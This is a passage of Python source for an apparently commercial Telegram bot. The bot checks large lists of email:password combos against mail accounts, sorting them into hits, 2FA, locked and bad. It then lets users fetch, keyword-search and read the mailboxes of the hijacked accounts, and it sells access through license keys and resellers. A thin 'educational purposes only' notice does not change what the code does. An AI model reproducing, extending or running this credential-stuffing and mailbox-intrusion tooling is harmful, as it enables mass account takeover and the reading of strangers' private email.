                        kw_preview = ", ".join(list(kw_details.keys())[:5])
                    else:
                        kw_preview = ", ".join(list(kw_details)[:5])
                    detail += f"\n     └ {kw_preview}"
                hits.append(detail)
            elif category == "bad":
                bad.append(f"{email}:{password} ({reason or 'invalid credentials'})")
            elif category == "twofa":
                twofa.append(f"{email}:{password} ({reason})")
            elif category == "locked":
                locked.append(f"{email}:{password} ({reason or 'locked/throttled'})")
            else:
                errors.append(f"{email}:{password} ({reason or category})")
        except Exception as e:
            errors.append(f"{combo} (Error: {str(e)})")
            logger.error(f"Error checking combo {combo}: {e}")
        finally:
            done += 1

    refresh_task = asyncio.create_task(refresher())
    queue_iter = iter(combos)

    async def worker():
        while not cancel.is_set():
            try:
                combo = next(queue_iter)
            except StopIteration:
                return
            await run_one(combo)

    try:
        if use_proxy:
            async with proxy_batch_lock:
                await asyncio.gather(*(worker() for _ in range(min(threads, total))))
        else:
            await asyncio.gather(*(worker() for _ in range(min(threads, total))))
    finally:
        refresh_task.cancel()
        try:
            await refresh_task
        except (asyncio.CancelledError, Exception):
            pass
        pool.shutdown(wait=False, cancel_futures=True)
        if user.id in user_jobs:
            user_jobs[user.id].pop("cancel", None)

    # --- Stopped by the user mid-run ---------------------------------------
    if cancel.is_set():
        try:
            await progress_msg.edit_text(
                f"⛔ Checking stopped.\n\nChecked: {done}/{total}", reply_markup=None
            )
        except Exception:
            pass
        await asyncio.sleep(5)
        try:
            await progress_msg.delete()
        except Exception:
            pass
        await clear_job(user.id)
        user_data = await get_user(user.id)
        expiry = user_data["expiry"] if user_data and user_data.get("expiry") else "2099-01-01T00:00:00"
        await show_main_menu(update, expiry)
        return

    # Final progress snapshot
    try:
        await progress_msg.edit_text(progress_text(), reply_markup=None)
    except Exception:
        pass

    # Log job
    await log_job(user.id, "checker", len(combos))

    # Keep results around so the download buttons can fetch them
    checker_results[user.id] = {
        "hits": list(hits),
        "twofa": list(twofa),
        "locked": list(locked),
        "bad": list(bad),
        "errors": list(errors),
        "stamp": datetime.now().strftime("%Y%m%d_%H%M%S"),
    }

    # Send results
    results_text = f"""
✅ Check Complete

Total: {len(combos)}
✅ Hits: {len(hits)}
🔐 2FA: {len(twofa)}
🔒 Locked: {len(locked)}
❌ Bad: {len(bad)}
⚠️ Errors: {len(errors)}
"""

    if hits:
        results_text += "\n✅ HITS\n"
        for hit in hits[:20]:
            results_text += f"{hit}\n"
        if len(hits) > 20:
            results_text += f"... and {len(hits) - 20} more\n"

    if twofa:
        results_text += "\n🔐 2FA / ACCESS DENIED\n"
        for entry in twofa[:10]:
            results_text += f"{entry}\n"
        if len(twofa) > 10:
            results_text += f"... and {len(twofa) - 10} more\n"

    if locked:
        results_text += "\n🔒 LOCKED / THROTTLED\n"
        for entry in locked[:10]:
            results_text += f"{entry}\n"
        if len(locked) > 10:
            results_text += f"... and {len(locked) - 10} more\n"

    if bad:
        results_text += "\n❌ BAD\n"
        for entry in bad[:10]:
            results_text += f"{entry}\n"
        if len(bad) > 10:
            results_text += f"... and {len(bad) - 10} more\n"

    if errors:
        results_text += "\n⚠️ ERRORS\n"
        for entry in errors[:10]:
            results_text += f"{entry}\n"
        if len(errors) > 10:
            results_text += f"... and {len(errors) - 10} more\n"

    chunks = chunk_message(results_text)
    for chunk in chunks:
        await update.message.reply_text(chunk)

    # Download buttons for each result category + back to menu
    dl_rows = []
    if hits:
        dl_rows.append([InlineKeyboardButton(f"⬇️ Hits ({len(hits)})", callback_data="ck_dl_hits")])
    if twofa:
        dl_rows.append([InlineKeyboardButton(f"⬇️ 2FA ({len(twofa)})", callback_data="ck_dl_twofa")])
    if locked:
        dl_rows.append([InlineKeyboardButton(f"⬇️ Locked ({len(locked)})", callback_data="ck_dl_locked")])
    if bad:
        dl_rows.append([InlineKeyboardButton(f"⬇️ Bad ({len(bad)})", callback_data="ck_dl_bad")])
    if errors:
        dl_rows.append([InlineKeyboardButton(f"⬇️ Errors ({len(errors)})", callback_data="ck_dl_errors")])
    dl_rows.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")])
    await update.message.reply_text(
        "📥 Download your results below:", reply_markup=InlineKeyboardMarkup(dl_rows)
    )

    # Read the queue before clearing the job state (clear_job drops the queue)
    next_job = await get_queued_job(user.id)
    await clear_job(user.id)

    # Process next queued job
    if next_job:
        if next_job == "checker":
            await handle_brute_checker(update, context)
        elif next_job == "inbox":
            await handle_inbox_viewer(update, context)
        elif next_job == "read":
            await handle_read_email(update, context)


async def handle_inbox_fetch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inbox fetching and keyword search."""
    user = update.effective_user
    text = update.message.text.strip()

    # "email:password" fetches the selected folder, "email:password keyword" searches
    parts = text.split(None, 1)
    combo = parts[0]
    query = parts[1].strip() if len(parts) > 1 else ""

    if ":" not in combo:
        await update.message.reply_text("❌ Invalid format. Use `email:password` or `email:password keyword`")
        await clear_job(user.id)
        return

    email, password = combo.split(":", 1)
    folder = get_inbox_folder(user.id)
    folder_label = INBOX_FOLDERS.get(folder, "📥 Inbox")

    progress_msg = await update.message.reply_text(
        "⏳ Searching..." if query else "⏳ Fetching mailbox..."
    )
    if user.id not in user_jobs:
        user_jobs[user.id] = {"feature": "inbox", "progress_msg": None, "queue": []}
    user_jobs[user.id]["progress_msg"] = progress_msg

    try:
        if query:
            emails = await async_search_folders(email, password, query, limit=15)
        else:
            emails = await async_get_inbox(email, password, limit=10, folder=folder)

        if not emails:
            await progress_msg.edit_text(
                f"❌ No results. Nothing matched '{query}'."
                if query
                else f"❌ No emails found in {folder_label} or failed to fetch."
            )
            await clear_job(user.id)
            return

        header = (
            f"🔍 {len(emails)} result(s) for '{query}' (Inbox/Junk/Sent) — {email}\n\n"
            if query
            else f"{folder_label} for {email} — {len(emails)} message(s)\n\n"
        )
        lines = header
        for i, email_data in enumerate(emails, 1):
            folder_tag = email_data.get("folder")
            folder_note = f"   Folder: {INBOX_FOLDERS.get(folder_tag, folder_tag)}\n" if folder_tag else ""
            lines += f"{i}. From: {email_data.get('from', 'N/A')}\n"
            lines += f"   Subject: {email_data.get('subject', 'N/A')}\n"
            lines += f"   Date: {email_data.get('date', 'N/A')}\n"
            lines += folder_note
            lines += f"   UID: {email_data.get('uid', 'N/A')}\n\n"

        for chunk in chunk_message(lines):
            await update.message.reply_text(chunk)

        await log_job(user.id, "search" if query else "inbox", len(emails))

    except Exception as e:
        logger.error(f"Error fetching inbox: {e}")
        await progress_msg.edit_text(f"❌ Error: {str(e)}")

    await clear_job(user.id)


async def handle_email_read(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle email reading."""
    user = update.effective_user
    text = update.message.text.strip()

    parts = text.split()
    if len(parts) < 2 or ":" not in parts[0]:
        await update.message.reply_text("❌ Invalid format. Use `email:password UID`")
        await clear_job(user.id)
        return

    email_password = parts[0]
    uid = parts[1]
    email, password = email_password.split(":", 1)

    progress_msg = await update.message.reply_text("⏳ Reading email...")
    if user.id not in user_jobs:
        user_jobs[user.id] = {"feature": "read", "progress_msg": None, "queue": []}
    user_jobs[user.id]["progress_msg"] = progress_msg

    try:
        email_data = await async_read_email(email, password, uid)

        if email_data.get("error"):
            await progress_msg.edit_text(f"❌ {email_data['error']}")
            await clear_job(user.id)
            return

        if not email_data.get("body"):
            await progress_msg.edit_text("❌ Failed to read email or email not found.")
            await clear_job(user.id)
            return

        email_text = f"""
📩 Email

From: {email_data.get('from', 'N/A')}
To: {email_data.get('to', 'N/A')}
Subject: {email_data.get('subject', 'N/A')}
Date: {email_data.get('date', 'N/A')}

Body:
{email_data.get('body', '')}
"""

        chunks = chunk_message(email_text)
        for chunk in chunks:
            await update.message.reply_text(chunk)

        await log_job(user.id, "read", 1)

    except Exception as e:
        logger.error(f"Error reading email: {e}")
        await progress_msg.edit_text(f"❌ Error: {str(e)}")

    await clear_job(user.id)


# =============================================================================
# === ADMIN CALLBACK HANDLERS ===============================================
# =============================================================================

async def handle_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin panel callbacks."""
    query = update.callback_query
    await query.answer()

    user = update.effective_user
    if not is_owner(user.id):
        await query.edit_message_text("❌ You are not the owner.")
        return

    data = query.data

    if data == "admin_panel":
        await admin_panel(update, context)
        return

    if data == "admin_genkey":
        keyboard = [
            [
                InlineKeyboardButton("10 min", callback_data="genkey_10m"),
                InlineKeyboardButton("1 hour", callback_data="genkey_1h"),
                InlineKeyboardButton("1 day", callback_data="genkey_1d"),
            ],
            [
                InlineKeyboardButton("3 days", callback_data="genkey_3d"),
                InlineKeyboardButton("1 week", callback_data="genkey_1w"),
                InlineKeyboardButton("1 month", callback_data="genkey_1mo"),
            ],
            [
                InlineKeyboardButton("3 months", callback_data="genkey_3mo"),
                InlineKeyboardButton("6 months", callback_data="genkey_6mo"),
                InlineKeyboardButton("1 year", callback_data="genkey_1y"),
            ],
            [
                InlineKeyboardButton("Lifetime", callback_data="genkey_lifetime"),
                InlineKeyboardButton("Custom", callback_data="genkey_custom"),
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🔑 Select duration:", reply_markup=reply_markup)

    elif data == "admin_listkeys":
        keys = await list_keys()
        if not keys:
            await query.edit_message_text("📋 No keys found.")
            return
        output = f"📋 All Keys (Total: {len(keys)})\n\n"
        for key in keys[:20]:
            status = "❌ Revoked" if key["revoked"] else "✅ Active"
            used = f"Used by {key['used_by']}" if key["used_by"] else "Unused"
            multiuse = " [Multi]" if key["multiuse"] else ""
            created = key.get('created_at', 'N/A')
            output += f"{key['key']}\n  Status: {status}\n  {used}{multiuse}\n  Created: {created}\n\n"
        if len(keys) > 20:
            output += f"... and {len(keys) - 20} more\n\nUse /listkeys in chat to see all keys"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(output, reply_markup=reply_markup)

    elif data == "admin_revoke":
        await query.edit_message_text("🔓 Send /revoke <key> to revoke a key\n\nExample: /revoke MAIL-XXXX-XXXX-XXXX")

    elif data == "admin_extend":
        await query.edit_message_text("⏰ Send /extend <key> <duration> to extend a key\n\nExample: /extend MAIL-XXXX-XXXX-XXXX 7d")

    elif data == "admin_reset":
        await query.edit_message_text("👤 Send /resetuser <user_id> to reset a user\n\nExample: /resetuser 123456789")

    elif data == "admin_addreseller":
        await query.edit_message_text("➕ Send /addreseller <user_id> to add reseller\n\nExample: /addreseller 123456789")

    elif data == "admin_stats":
        stats = await get_global_stats()
        stats_text = f"""
📊 GLOBAL STATISTICS

👥 Total Users · {stats['total_users']}
🔑 Active Keys · {stats['active_keys']}
✅ Used Keys · {stats['used_keys']}
🔢 Total Checks · {stats['total_checks']}
"""
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(stats_text, reply_markup=reply_markup)

    elif data == "admin_broadcast":
        await query.edit_message_text("📢 Send /broadcast <message> to broadcast to all users\n\nExample: /broadcast Maintenance in 1 hour")

    elif data == "admin_back":
        await admin_panel(update, context)

    elif data.startswith("genkey_"):
        duration = data.replace("genkey_", "")
        if duration == "custom":
            await query.edit_message_text("Use /genkey <duration> [amount] for custom duration.\nExample: /genkey 5d 10")
        else:
            duration_seconds = parse_duration(duration)
            key = generate_key()
            await save_key(key, duration_seconds, user.id)
            await query.edit_message_text(f"✅ Generated key for {duration}:\n\n{key}")


# =============================================================================
# === EXPIRY CHECK JOB =======================================================
# =============================================================================

async def check_expiry_job(context: ContextTypes.DEFAULT_TYPE):
    """Background job to check expiring licenses and send warnings."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        now = datetime.now()
        warning_24h = now + timedelta(hours=24)
        warning_1h = now + timedelta(hours=1)
        warning_10min = now + timedelta(minutes=10)

        async with db.execute("SELECT * FROM users WHERE expiry IS NOT NULL") as cursor:
            rows = await cursor.fetchall()
            for row in rows:
                user = dict(row)
                if not user["expiry"]:
                    continue

                try:
                    expiry = datetime.fromisoformat(user["expiry"])
                    user_id = user["user_id"]

                    # Check if expired
                    if expiry <= now:
                        # Send renewal button
                        keyboard = [
                            [InlineKeyboardButton("🔁 Renew", callback_data=f"renew_{user_id}")],
                        ]
                        reply_markup = InlineKeyboardMarkup(keyboard)
                        try:
                            await context.bot.send_message(
                                user_id,
                                "⚠️ Your license has expired.\n\nContact owner to renew:",
                                reply_markup=reply_markup,
                            )
                        except TelegramError:
                            pass  # User blocked bot or doesn't exist

                    # Send warnings
                    elif expiry <= warning_10min:
                        try:
                            await context.bot.send_message(
                                user_id,
                                f"⚠️ Your license expires in 10 minutes!",
                            )
                        except TelegramError:
                            pass
                    elif expiry <= warning_1h:
                        try:
                            await context.bot.send_message(
                                user_id,
                                f"⚠️ Your license expires in 1 hour!",
                            )
                        except TelegramError:
                            pass
                    elif expiry <= warning_24h:
                        try:
                            await context.bot.send_message(
                                user_id,
                                f"⚠️ Your license expires in 24 hours!",
                            )
                        except TelegramError:
                            pass

                except Exception as e:
                    logger.error(f"Error checking expiry for user {user['user_id']}: {e}")


# =============================================================================
# === STARTUP NOTIFICATION ===================================================
# =============================================================================

async def notify_owner(application: Application):
    """Send startup notification to owner."""
    owner_id = CONFIG["OWNER_IDS"][0]
    startup_text = f"""
🚀 Bot Started

Owner: {CONFIG['OWNER_USERNAME']}

⚠️ Reminder: This tool is for EDUCATIONAL PURPOSES ONLY.
Users should only check accounts they own.

Bot is online and ready to use.
"""
    try:
        await application.bot.send_message(owner_id, startup_text)
    except TelegramError as e:
        logger.error(f"Failed to notify owner: {e}")
